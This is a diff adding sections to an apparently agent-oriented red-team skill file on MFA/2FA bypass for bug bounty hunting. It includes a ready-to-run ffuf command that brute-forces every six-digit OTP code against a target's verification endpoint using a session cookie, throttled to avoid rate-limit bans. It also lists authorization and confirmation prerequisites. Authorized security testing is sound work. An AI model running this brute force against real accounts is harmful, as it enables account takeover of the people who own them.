@@ -8,6 +8,34 @@ category: redteam
 tags: [mfa, bypass, hunt, redteam]
 ---
 
+## When to Use
+
+- Hunting auth bypass, MFA flows, chaining primitives toward ATO.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `ffuf`, `jq`, `proxychains`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Test with ffuf — all 1M 6-digit codes
+ffuf -u "https://target.com/api/verify-otp" \
+  -X POST -H "Content-Type: application/json" \
+  -H "Cookie: session=YOUR_SESSION" \
+  -d '{"otp":"FUZZ"}' \
+  -w <(seq -w 000000 999999) \
+  -fc 400,429 -t 5
+# -t 5 (slow down) — aggressive rates get 429 or ban
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
+
 ## 19. MFA / 2FA BYPASS
 > Growing bug class — 7 distinct patterns. Pays High/Critical when it enables ATO without prior session.
 
